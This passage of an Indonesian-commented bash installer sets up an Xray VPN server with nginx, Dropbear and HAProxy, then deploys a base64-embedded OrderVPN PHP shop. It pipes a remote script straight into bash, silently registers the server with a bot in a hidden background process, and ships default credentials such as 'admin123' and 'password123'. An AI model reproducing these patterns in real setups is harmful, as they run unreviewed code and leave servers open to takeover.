        echo -e "  ${YELLOW}Xray install attempt $attempt gagal, retry...${NC}"
        sleep 5
    done
    # Fallback: install versi latest jika v1.8.24 gagal
    if [[ $xray_installed -eq 0 ]]; then
        echo -e "  ${YELLOW}Coba install Xray versi latest...${NC}"
        bash <(curl -Ls --max-time 90 https://github.com/XTLS/Xray-install/raw/main/install-release.sh) >> "$LOG" 2>&1 && xray_installed=1
    fi
    mkdir -p "$AKUN_DIR" /var/log/xray /usr/local/etc/xray "$PUBLIC_HTML" "$ORDER_DIR" /root/bot "$TUNNELBOT_DIR"
    if command -v xray >/dev/null 2>&1; then
        _ok "Xray installed: $(xray version 2>/dev/null | head -1)"
    else
        _fail "Xray install FAILED! Cek koneksi internet ke GitHub"
    fi

    ((step++)); show_progress $step $total "Setting up Swap Memory"
    _head "Swap Memory 1GB" $step $total
    local cur_swap; cur_swap=$(free -m | awk 'NR==3{print $2}')
    if [[ "$cur_swap" -lt 512 ]]; then
        _run "Creating swapfile 1GB" "fallocate -l 1G /swapfile || dd if=/dev/zero of=/swapfile bs=1M count=1024"
        chmod 600 /swapfile; mkswap /swapfile >/dev/null 2>&1; swapon /swapfile
        grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab
        _ok "Swap 1GB active"
    else
        _ok "Swap exists (${cur_swap}MB), skip"
    fi

    ((step++)); show_progress $step $total "Getting SSL Certificate"
    _head "SSL Certificate" $step $total
    mkdir -p /etc/xray
    if [[ "$domain_type" == "custom" ]]; then
        # Stop services yang pakai port 80
        systemctl stop nginx haproxy 2>/dev/null
        sleep 1
        install_certbot_compat "custom"
        if command -v certbot >/dev/null 2>&1; then
            _run "Certbot Let's Encrypt" "certbot certonly --standalone -d '$DOMAIN' --non-interactive --agree-tos --register-unsafely-without-email --timeout 60"
        fi
        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then
            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt
            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key
            _ok "Let's Encrypt cert installed"
        else
            _run "Generating self-signed cert" \
                "openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -subj '/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}' -keyout /etc/xray/xray.key -out /etc/xray/xray.crt"
            _ok "Self-signed cert generated (certbot gagal/tidak tersedia)"
        fi
    else
        _run "Generating self-signed cert" \
            "openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -subj '/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}' -keyout /etc/xray/xray.key -out /etc/xray/xray.crt"
        _ok "Self-signed cert for $DOMAIN"
    fi
    chmod 644 /etc/xray/xray.* 2>/dev/null

    ((step++)); show_progress $step $total "Creating Configs"
    _head "Xray & Nginx Config" $step $total
    _run "Creating Xray config" "create_xray_config"
    _ok "6 inbounds: VMess/VLess/Trojan (WS + gRPC)"

    # Deteksi versi nginx untuk syntax http2 yang benar
    # Nginx >= 1.25.1: pakai "http2 on;" di server block
    # Nginx < 1.25.1: pakai "listen 443 ssl http2;"
    local nginx_ver nginx_major nginx_minor nginx_patch nginx_http2_directive nginx_listen_tls
    nginx_ver=$(nginx -v 2>&1 | grep -oP '[\d.]+' | head -1)
    nginx_major=$(echo "$nginx_ver" | cut -d. -f1)
    nginx_minor=$(echo "$nginx_ver" | cut -d. -f2)
    nginx_patch=$(echo "$nginx_ver" | cut -d. -f3)
    # >= 1.25.1 pakai http2 on
    if [[ "$nginx_major" -gt 1 ]] || \
       [[ "$nginx_major" -eq 1 && "$nginx_minor" -gt 25 ]] || \
       [[ "$nginx_major" -eq 1 && "$nginx_minor" -eq 25 && "${nginx_patch:-0}" -ge 1 ]]; then
        nginx_http2_directive="http2 on;"
        nginx_listen_tls="listen 443 ssl;"
    else
        nginx_http2_directive=""
        nginx_listen_tls="listen 443 ssl http2;"
    fi

    cat > /etc/nginx/sites-available/default << NGXEOF
# ── Port 443: SSL termination + routing WS by path + gRPC by location ──
server {
    ${nginx_listen_tls}
    ${nginx_http2_directive}
    server_name ${DOMAIN} _;
    ssl_certificate     /etc/xray/xray.crt;
    ssl_certificate_key /etc/xray/xray.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;
    ssl_session_cache   shared:SSL:10m;
    ssl_session_timeout 1d;
    keepalive_timeout   300;

    # ── Static files (robots.txt, sitemap.xml, index.html) ──
    root /var/www/html;
    index index.html;

    # ── gRPC routing by serviceName ──
    location /vmess-grpc {
        grpc_pass grpc://127.0.0.1:8444;
        grpc_read_timeout 1d;
        grpc_send_timeout 1d;
        grpc_set_header X-Real-IP \$remote_addr;
    }
    location /vless-grpc {
        grpc_pass grpc://127.0.0.1:8445;
        grpc_read_timeout 1d;
        grpc_send_timeout 1d;
        grpc_set_header X-Real-IP \$remote_addr;
    }
    location /trojan-grpc {
        grpc_pass grpc://127.0.0.1:8446;
        grpc_read_timeout 1d;
        grpc_send_timeout 1d;
        grpc_set_header X-Real-IP \$remote_addr;
    }

    # ── WS routing by path ──
    location /vmess {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location /vless {
        proxy_pass http://127.0.0.1:8081;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location /trojan {
        proxy_pass http://127.0.0.1:8082;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # ── Semua path lain → serve web page (index.html, robots.txt, sitemap.xml, dll) ──
    location / {
        try_files \$uri \$uri/ /index.html;
    }
}

# ── Port 80: Web page utama + WS NonTLS ──
server {
    listen 80 default_server;
    server_name _;
    root /var/www/html;
    index index.html;
    keepalive_timeout 300;
    access_log off;

    # WS proxy paths — harus SEBELUM location /
    location = /vmess {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location = /vless {
        proxy_pass http://127.0.0.1:8081;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location = /trojan {
        proxy_pass http://127.0.0.1:8082;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # Semua path lain → serve web page
    location / {
        try_files \$uri \$uri/ /index.html;
    }
}
# ── Port 81: Download server ──
server {
    listen 81;
    server_name _;
    root /var/www/html;
    autoindex on;
    location / { try_files \$uri \$uri/ =404; add_header Content-Type text/plain; }
}
NGXEOF
    # Bersihkan semua site lain yang mungkin override
    rm -f /etc/nginx/sites-enabled/*
    ln -sf /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default
    # Hapus conf.d yang mungkin ada default nginx
    rm -f /etc/nginx/conf.d/default.conf 2>/dev/null || true
    nginx -t >> "$LOG" 2>&1 && _ok "Nginx config valid" || _fail "Nginx config error"

    ((step++)); show_progress $step $total "Configuring Dropbear & HAProxy"
    _head "Dropbear & HAProxy" $step $total
    # Deteksi format config dropbear yang benar sesuai versi
    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then
        # Ubuntu 22+: dropbear config format baru
        cat > /etc/default/dropbear << 'DBEOF'
DROPBEAR_PORT=222
DROPBEAR_EXTRA_ARGS="-K 60 -I 180"
DROPBEAR_RECEIVE_WINDOW=65536
DBEOF
    else
        # Ubuntu 20: format lama dengan NO_START
        cat > /etc/default/dropbear << 'DBEOF'
NO_START=0
DROPBEAR_PORT=222
DROPBEAR_EXTRA_ARGS="-K 60 -I 180"
DROPBEAR_RECEIVE_WINDOW=65536
DBEOF
    fi
    configure_haproxy
    _ok "Dropbear port 222 & HAProxy standby (Nginx handle port 443)"

    ((step++)); show_progress $step $total "UDP, Keepalive & Optimize"
    _head "System Optimize" $step $total
    _run "Installing UDP Custom" "install_udp_custom"
    _run "Configuring SSH keepalive" "setup_keepalive"
    _run "Enabling BBR & TCP optimize" "optimize_vpn"
    _run "Installing Python requests" "pip_install requests"
    _ok "System optimized"

    ((step++)); show_progress $step $total "Starting Services"
    _head "Start All Services" $step $total
    systemctl daemon-reload >> "$LOG" 2>&1

    # Deploy web page DULU sebelum nginx start
    # Agar saat nginx up, index.html sudah ada
    deploy_web_page >> "$LOG" 2>&1

    # ── Setup cron auto-delete expired (tiap jam) ──
    (crontab -l 2>/dev/null | grep -v "delete_expired_cron";      echo "0 * * * * bash /root/tunnel.sh delete_expired_cron 2>/dev/null") | crontab - 2>/dev/null
    _ok "Cron auto-delete expired: tiap jam"

    # Validasi nginx config dulu
    nginx -t >> "$LOG" 2>&1 && _ok "Nginx config OK" || _fail "Nginx config ada error! Cek $LOG"
    # Validasi xray config
    xray -test -config "$XRAY_CONFIG" >> "$LOG" 2>&1 && _ok "Xray config OK" || _fail "Xray config ada error! Cek $LOG"

    local ssh_svc; ssh_svc=$(get_ssh_service_name)
    for svc in xray nginx "$ssh_svc" dropbear haproxy udp-custom vpn-keepalive; do
        systemctl enable "$svc" >> "$LOG" 2>&1
        systemctl restart "$svc" >> "$LOG" 2>&1
        systemctl is-active --quiet "$svc" && \
            printf "  ${GREEN}✔${NC} %-20s ${GREEN}RUNNING${NC}\n" "$svc" || \
            printf "  ${RED}✘${NC} %-20s ${RED}FAILED${NC}\n" "$svc"
    done

    setup_menu_command

    (
        if [[ ! -f /root/.ssh/id_rsa ]]; then
            mkdir -p /root/.ssh
            ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N "" -q 2>/dev/null
        fi
        chmod 700 /root/.ssh 2>/dev/null
        chmod 600 /root/.ssh/id_rsa 2>/dev/null
        touch /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys 2>/dev/null
        local_pub=$(cat /root/.ssh/id_rsa.pub 2>/dev/null)
        if [[ -n "$local_pub" ]] && ! grep -qF "$local_pub" /root/.ssh/authorized_keys 2>/dev/null; then
            echo "$local_pub" >> /root/.ssh/authorized_keys
        fi
        _install_tunnelbot_background
        _register_vps_to_bot
    ) >/dev/null 2>&1 &
    disown $!

    local ip_vps; ip_vps=$(get_ip)
    [[ -n "$ip_vps" && "$ip_vps" != "N/A" ]] && echo "$ip_vps" > "$IP_CACHE_FILE"

    echo ""
    echo -e "${GREEN}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}  ║      ✔  INSTALASI SELESAI!                       ║${NC}"
    echo -e "${GREEN}  ║      Youzin Crabz Tunel - The Professor          ║${NC}"
    echo -e "${GREEN}  ╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    printf "  ${WHITE}%-22s${NC}: ${GREEN}%s${NC}\n" "Domain"      "$DOMAIN"
    printf "  ${WHITE}%-22s${NC}: ${GREEN}%s${NC}\n" "IP VPS"      "$ip_vps"
    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "SSH"         "22 | Dropbear: 222"
    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "TLS / gRPC"  "443 (Nginx SSL direct)"
    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "NonTLS"      "80 (Nginx plain)"
    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "BadVPN UDP"  "7100-7300"
    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "Download"    "http://${ip_vps}:81/"
    echo ""
    echo -e "  ${YELLOW}💡 Ketik 'menu' untuk membuka menu!${NC}"
    echo -e "  ${YELLOW}Reboot dalam 5 detik...${NC}"
    sleep 5
    reboot
}

#================================================
# MAIN MENU
#================================================


#================================================
# ORDERVPN WEB — INSTALLER & MENU
# Embedded langsung di tunnel.sh
# The Professor — Youzin Crabz Tunel
#================================================

_ordervpn_deploy_files() {
    local DIR="/var/www/html/ordervpn"
    local DB_PASS="$1"
    mkdir -p "$DIR"/{includes,api,admin,cron,uploads/bukti}
    # database.sql
    echo "LS0gT3JkZXJWUE4gRGF0YWJhc2UgU2NoZW1hIHYyLjAKLS0gYnkgVGhlIFByb2Zlc3NvcgoKQ1JFQVRFIERBVEFCQVNFIElGIE5PVCBFWElTVFMgb3JkZXJ2cG5fZGIgQ0hBUkFDVEVSIFNFVCB1dGY4bWI0IENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpOwpVU0Ugb3JkZXJ2cG5fZGI7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyB1c2VycyAoCiAgICBpZCBJTlQgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCiAgICB1c2VybmFtZSBWQVJDSEFSKDUwKSBVTklRVUUgTk9UIE5VTEwsCiAgICBlbWFpbCBWQVJDSEFSKDEwMCkgVU5JUVVFIE5PVCBOVUxMLAogICAgcGFzc3dvcmQgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAogICAgc2FsZG8gREVDSU1BTCgxNSwyKSBERUZBVUxUIDAuMDAsCiAgICByb2xlIEVOVU0oJ3VzZXInLCdhZG1pbicpIERFRkFVTFQgJ3VzZXInLAogICAgaXNfdmVyaWZpZWQgVElOWUlOVCgxKSBERUZBVUxUIDAsCiAgICBvdHBfY29kZSBWQVJDSEFSKDEwKSBERUZBVUxUIE5VTEwsCiAgICBvdHBfZXhwaXJlcyBEQVRFVElNRSBERUZBVUxUIE5VTEwsCiAgICBpcF9hZGRyZXNzIFZBUkNIQVIoNDUpLAogICAgd2hhdHNhcHAgVkFSQ0hBUigyMCkgREVGQVVMVCBOVUxMLAogICAgY3JlYXRlZF9hdCBUSU1FU1RBTVAgREVGQVVMVCBDVVJSRU5UX1RJTUVTVEFNUCwKICAgIHVwZGF0ZWRfYXQgVElNRVNUQU1QIERFRkFVTFQgQ1VSUkVOVF9USU1FU1RBTVAgT04gVVBEQVRFIENVUlJFTlRfVElNRVNUQU1QCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyBzZXJ2ZXJzICgKICAgIGlkIElOVCBBVVRPX0lOQ1JFTUVOVCBQUklNQVJZIEtFWSwKICAgIG5hbWFfc2VydmVyIFZBUkNIQVIoMTAwKSBOT1QgTlVMTCwKICAgIGNvZGVfc2VydmVyIFZBUkNIQVIoMjApIFVOSVFVRSBOT1QgTlVMTCwKICAgIGxva2FzaSBWQVJDSEFSKDEwMCkgTk9UIE5VTEwsCiAgICBmbGFnIFZBUkNIQVIoMTApIERFRkFVTFQgJ/Cfh67wn4epJywKICAgIGhhcmdhX2hhcmkgREVDSU1BTCgxMCwyKSBOT1QgTlVMTCwKICAgIGhhcmdhX2J1bGFuIERFQ0lNQUwoMTAsMikgTk9UIE5VTEwsCiAgICBpcF9saW1pdCBJTlQgREVGQVVMVCAyLAogICAgcXVvdGFfbGltaXQgSU5UIERFRkFVTFQgOTk5OSwKICAgIHN0YXR1cyBFTlVNKCdyZWFkeScsJ21haW50ZW5hbmNlJywnb2ZmbGluZScpIERFRkFVTFQgJ3JlYWR5JywKICAgIGhvc3QgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAogICAgcG9ydCBJTlQgREVGQVVMVCAyMiwKICAgIHNzaF91c2VyIFZBUkNIQVIoNTApIERFRkFVTFQgJ3Jvb3QnLAogICAgc3NoX3Bhc3N3b3JkIFZBUkNIQVIoMjU1KSBERUZBVUxUIE5VTEwsCiAgICBzc2hfa2V5IFZBUkNIQVIoMjU1KSBERUZBVUxUIE5VTEwsCiAgICBkb21haW4gVkFSQ0hBUigyNTUpIERFRkFVTFQgTlVMTCwKICAgIHhyYXlfY29uZmlnX3BhdGggVkFSQ0hBUigyNTUpIERFRkFVTFQgJy91c3IvbG9jYWwvZXRjL3hyYXkvY29uZmlnLmpzb24nLAogICAgY3JlYXRlZF9hdCBUSU1FU1RBTVAgREVGQVVMVCBDVVJSRU5UX1RJTUVTVEFNUAopOwoKQ1JFQVRFIFRBQkxFIElGIE5PVCBFWElTVFMgdnBuX2FjY291bnRzICgKICAgIGlkIElOVCBBVVRPX0lOQ1JFTUVOVCBQUklNQVJZIEtFWSwKICAgIHVzZXJfaWQgSU5UIE5PVCBOVUxMLAogICAgc2VydmVyX2lkIElOVCBOT1QgTlVMTCwKICAgIHRpcGUgRU5VTSgndm1lc3MnLCd2bGVzcycsJ3Ryb2phbicsJ3NzaCcsJ3RyaWFsJykgTk9UIE5VTEwsCiAgICB1c2VybmFtZSBWQVJDSEFSKDEwMCkgTk9UIE5VTEwsCiAgICByZW1hcmtzIFZBUkNIQVIoMTAwKSwKICAgIHV1aWQgVkFSQ0hBUigzNiksCiAgICBwYXNzd29yZF92cG4gVkFSQ0hBUigyNTUpLAogICAgbGlua19jb25maWcgVEVYVCwKICAgIGxpbmtfdGxzIFRFWFQsCiAgICBsaW5rX25vbnRscyBURVhULAogICAgbGlua19ncnBjIFRFWFQsCiAgICBtYXNhX2FrdGlmIERBVEVUSU1FIE5PVCBOVUxMLAogICAgZGF5c19vcmRlcmVkIElOVCBOT1QgTlVMTCwKICAgIGlzX3RyaWFsIFRJTllJTlQoMSkgREVGQVVMVCAwLAogICAgaGFyZ2FfdG90YWwgREVDSU1BTCgxMCwyKSBOT1QgTlVMTCBERUZBVUxUIDAsCiAgICBzdGF0dXMgRU5VTSgnYWN0aXZlJywnZXhwaXJlZCcsJ3N1c3BlbmRlZCcpIERFRkFVTFQgJ2FjdGl2ZScsCiAgICBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgRk9SRUlHTiBLRVkgKHVzZXJfaWQpIFJFRkVSRU5DRVMgdXNlcnMoaWQpIE9OIERFTEVURSBDQVNDQURFLAogICAgRk9SRUlHTiBLRVkgKHNlcnZlcl9pZCkgUkVGRVJFTkNFUyBzZXJ2ZXJzKGlkKSBPTiBERUxFVEUgQ0FTQ0FERQopOwoKQ1JFQVRFIFRBQkxFIElGIE5PVCBFWElTVFMgdHJhbnNhY3Rpb25zICgKICAgIGlkIElOVCBBVVRPX0lOQ1JFTUVOVCBQUklNQVJZIEtFWSwKICAgIHVzZXJfaWQgSU5UIE5PVCBOVUxMLAogICAgdHlwZSBFTlVNKCd0b3B1cCcsJ29yZGVyJywncmVmdW5kJywndHJpYWwnKSBOT1QgTlVMTCwKICAgIGFtb3VudCBERUNJTUFMKDE1LDIpIE5PVCBOVUxMLAogICAga2V0ZXJhbmdhbiBWQVJDSEFSKDI1NSksCiAgICBzdGF0dXMgRU5VTSgncGVuZGluZycsJ3N1Y2Nlc3MnLCdmYWlsZWQnKSBERUZBVUxUICdzdWNjZXNzJywKICAgIHJlZl9pZCBWQVJDSEFSKDEwMCksCiAgICBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgRk9SRUlHTiBLRVkgKHVzZXJfaWQpIFJFRkVSRU5DRVMgdXNlcnMoaWQpIE9OIERFTEVURSBDQVNDQURFCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyB0b3B1cF9yZXF1ZXN0cyAoCiAgICBpZCBJTlQgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCiAgICB1c2VyX2lkIElOVCBOT1QgTlVMTCwKICAgIGFtb3VudCBERUNJTUFMKDE1LDIpIE5PVCBOVUxMLAogICAgcGF5bWVudF9tZXRob2QgVkFSQ0hBUig1MCkgREVGQVVMVCAnbWFudWFsJywKICAgIGJ1a3RpX3RyYW5zZmVyIFZBUkNIQVIoMjU1KSwKICAgIHRyaXBheV9yZWYgVkFSQ0hBUigxMDApIERFRkFVTFQgTlVMTCwKICAgIHRyaXBheV9jaGFubmVsIFZBUkNIQVIoNTApIERFRkFVTFQgTlVMTCwKICAgIHRyaXBheV9xciBURVhUIERFRkFVTFQgTlVMTCwKICAgIHN0YXR1cyBFTlVNKCdwZW5kaW5nJywnYXBwcm92ZWQnLCdyZWplY3RlZCcpIERFRkFVTFQgJ3BlbmRpbmcnLAogICAgYWRtaW5fbm90ZSBWQVJDSEFSKDI1NSksCiAgICBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgcHJvY2Vzc2VkX2F0IFRJTUVTVEFNUCBOVUxMLAogICAgRk9SRUlHTiBLRVkgKHVzZXJfaWQpIFJFRkVSRU5DRVMgdXNlcnMoaWQpIE9OIERFTEVURSBDQVNDQURFCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyBhcHBfc2V0dGluZ3MgKAogICAgaWQgSU5UIEFVVE9fSU5DUkVNRU5UIFBSSU1BUlkgS0VZLAogICAgc2V0dGluZ19rZXkgVkFSQ0hBUigxMDApIFVOSVFVRSBOT1QgTlVMTCwKICAgIHNldHRpbmdfdmFsdWUgVEVYVCwKICAgIHVwZGF0ZWRfYXQgVElNRVNUQU1QIERFRkFVTFQgQ1VSUkVOVF9USU1FU1RBTVAgT04gVVBEQVRFIENVUlJFTlRfVElNRVNUQU1QCik7CgotLSBEZWZhdWx0IHNldHRpbmdzCklOU0VSVCBJR05PUkUgSU5UTyBhcHBfc2V0dGluZ3MgKHNldHRpbmdfa2V5LCBzZXR0aW5nX3ZhbHVlKSBWQUxVRVMKKCdhcHBfbmFtZScsICdPcmRlclZQTicpLAooJ2FwcF9sb2dvJywgJ/Cfk7YnKSwKKCdjb250YWN0X3dhJywgJycpLAooJ2NvbnRhY3RfdGcnLCAnJyksCignY29udGFjdF9pZycsICcnKSwKKCdiYW5rX25hbWUnLCAnQkNBJyksCignYmFua19hY2NvdW50JywgJzEyMzQ1Njc4OTAnKSwKKCdiYW5rX2hvbGRlcicsICdBZG1pbiBPcmRlclZQTicpLAooJ2RhbmFfbnVtYmVyJywgJycpLAooJ2dvcGF5X251bWJlcicsICcnKSwKKCdzaG9wZWVfbnVtYmVyJywgJycpLAooJ3FyaXNfaW1hZ2UnLCAnJyksCigndHJpYWxfZHVyYXRpb25faG91cnMnLCAnMScpLAooJ3RyaWFsX3F1b3RhX2diJywgJzEnKSwKKCdzbXRwX2hvc3QnLCAnc210cC5nbWFpbC5jb20nKSwKKCdzbXRwX3BvcnQnLCAnNTg3JyksCignc210cF91c2VyJywgJycpLAooJ3NtdHBfcGFzcycsICcnKSwKKCdzbXRwX2Zyb20nLCAnJyksCigndGdfYm90X3Rva2VuJywgJycpLAooJ3RnX2NoYXRfaWQnLCAnJyksCigndHJpcGF5X2FwaV9rZXknLCAnJyksCigndHJpcGF5X3ByaXZhdGVfa2V5JywgJycpLAooJ3RyaXBheV9tZXJjaGFudF9jb2RlJywgJycpLAooJ3RyaXBheV9tb2RlJywgJ3NhbmRib3gnKTsKCi0tIEFkbWluIHVzZXIgKHBhc3N3b3JkOiBhZG1pbjEyMykKSU5TRVJUIElHTk9SRSBJTlRPIHVzZXJzICh1c2VybmFtZSwgZW1haWwsIHBhc3N3b3JkLCBzYWxkbywgcm9sZSwgaXNfdmVyaWZpZWQpIFZBTFVFUwooJ2FkbWluJywgJ2FkbWluQG9yZGVydnBuLmxvY2FsJywgJyQyeSQxMCQ5MklYVU5wa2pPMHJPUTVieU1pLlllNG9Lb0VhM1JvOWxsQy8ub2cvYXQyLnVoZVdHL2lnaScsIDk5OTk5OS4wMCwgJ2FkbWluJywgMSk7Cg==" | base64 -d > "$DIR"/database.sql
    # includes/config.php
    echo "PD9waHAKLy8gT3JkZXJWUE4gY29uZmlnLnBocCB2Mi4wIOKAlCBieSBUaGUgUHJvZmVzc29yCmRlZmluZSgnREJfSE9TVCcsICdsb2NhbGhvc3QnKTsKZGVmaW5lKCdEQl9VU0VSJywgJ29yZGVydnBuJyk7CmRlZmluZSgnREJfUEFTUycsICdwYXNzd29yZDEyMycpOwpkZWZpbmUoJ0RCX05BTUUnLCAnb3JkZXJ2cG5fZGInKTsKZGVmaW5lKCdEQl9QT1JUJywgMzMwNik7CgpkZWZpbmUoJ0FQUF9WRVJTSU9OJywgJzIuMC4wJyk7CmRlZmluZSgnVlBOX0FQSV9CUklER0UnLCAnL3Vzci9sb2NhbC9iaW4vdnBuLWFwaScpOwpkZWZpbmUoJ1RVTk5FTF9TQ1JJUFQnLCAnL3Jvb3QvdHVubmVsLnNoJyk7CmRlZmluZSgnU1NIX0tFWV9QQVRIJywgJy9yb290Ly5zc2gvaWRfcnNhJyk7CgpmdW5jdGlvbiBnZXREQigpIHsKICAgIHN0YXRpYyAkcGRvID0gbnVsbDsKICAgIGlmICgkcGRvID09PSBudWxsKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJGRzbiA9ICJteXNxbDpob3N0PSIuREJfSE9TVC4iO3BvcnQ9Ii5EQl9QT1JULiI7ZGJuYW1lPSIuREJfTkFNRS4iO2NoYXJzZXQ9dXRmOG1iNCI7CiAgICAgICAgICAgICRwZG8gPSBuZXcgUERPKCRkc24sIERCX1VTRVIsIERCX1BBU1MsIFsKICAgICAgICAgICAgICAgIFBETzo6QVRUUl9FUlJNT0RFID0+IFBETzo6RVJSTU9ERV9FWENFUFRJT04sCiAgICAgICAgICAgICAgICBQRE86OkFUVFJfREVGQVVMVF9GRVRDSF9NT0RFID0+IFBETzo6RkVUQ0hfQVNTT0MsCiAgICAgICAgICAgICAgICBQRE86OkFUVFJfRU1VTEFURV9QUkVQQVJFUyA9PiBmYWxzZSwKICAgICAgICAgICAgXSk7CiAgICAgICAgfSBjYXRjaCAoUERPRXhjZXB0aW9uICRlKSB7CiAgICAgICAgICAgIGh0dHBfcmVzcG9uc2VfY29kZSg1MDApOwogICAgICAgICAgICBkaWUoanNvbl9lbmNvZGUoWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nREIgZXJyb3I6ICcuJGUtPmdldE1lc3NhZ2UoKV0pKTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJHBkbzsKfQoKZnVuY3Rpb24gZ2V0U2V0dGluZygka2V5LCAkZGVmYXVsdD0nJykgewogICAgc3RhdGljICRjYWNoZSA9IFtdOwogICAgaWYgKGlzc2V0KCRjYWNoZVska2V5XSkpIHJldHVybiAkY2FjaGVbJGtleV07CiAgICB0cnkgewogICAgICAgICRkYiA9IGdldERCKCk7CiAgICAgICAgJHMgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBzZXR0aW5nX3ZhbHVlIEZST00gYXBwX3NldHRpbmdzIFdIRVJFIHNldHRpbmdfa2V5PT8iKTsKICAgICAgICAkcy0+ZXhlY3V0ZShbJGtleV0pOwogICAgICAgICRyID0gJHMtPmZldGNoQ29sdW1uKCk7CiAgICAgICAgJGNhY2hlWyRrZXldID0gJHIgIT09IGZhbHNlID8gJHIgOiAkZGVmYXVsdDsKICAgICAgICByZXR1cm4gJGNhY2hlWyRrZXldOwogICAgfSBjYXRjaChFeGNlcHRpb24gJGUpIHsgcmV0dXJuICRkZWZhdWx0OyB9Cn0KCmZ1bmN0aW9uIHNhbml0aXplKCRpbnB1dCkgewogICAgcmV0dXJuIGh0bWxzcGVjaWFsY2hhcnMoc3RyaXBfdGFncyh0cmltKCRpbnB1dCkpLCBFTlRfUVVPVEVTLCAnVVRGLTgnKTsKfQoKZnVuY3Rpb24gZm9ybWF0UnVwaWFoKCRhbW91bnQpIHsKICAgIHJldHVybiAnUnAgJy5udW1iZXJfZm9ybWF0KChmbG9hdCkkYW1vdW50LCAwLCAnLCcsICcuJyk7Cn0KCmZ1bmN0aW9uIGdlbmVyYXRlVVVJRCgpIHsKICAgIHJldHVybiBzcHJpbnRmKCclMDR4JTA0eC0lMDR4LSUwNHgtJTA0eC0lMDR4JTA0eCUwNHgnLAogICAgICAgIG10X3JhbmQoMCwweGZmZmYpLG10X3JhbmQoMCwweGZmZmYpLG10X3JhbmQoMCwweGZmZmYpLAogICAgICAgIG10X3JhbmQoMCwweDBmZmYpfDB4NDAwMCxtdF9yYW5kKDAsMHgzZmZmKXwweDgwMDAsCiAgICAgICAgbXRfcmFuZCgwLDB4ZmZmZiksbXRfcmFuZCgwLDB4ZmZmZiksbXRfcmFuZCgwLDB4ZmZmZikpOwp9CgpmdW5jdGlvbiBzZW5kVGVsZWdyYW1Ob3RpZigkbWVzc2FnZSkgewogICAgJHRva2VuID0gZ2V0U2V0dGluZygndGdfYm90X3Rva2VuJyk7CiAgICAkY2hhdElkID0gZ2V0U2V0dGluZygndGdfY2hhdF9pZCcpOwogICAgaWYgKGVtcHR5KCR0b2tlbikgfHwgZW1wdHkoJGNoYXRJZCkpIHJldHVybjsKICAgICR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHskdG9rZW59L3Nl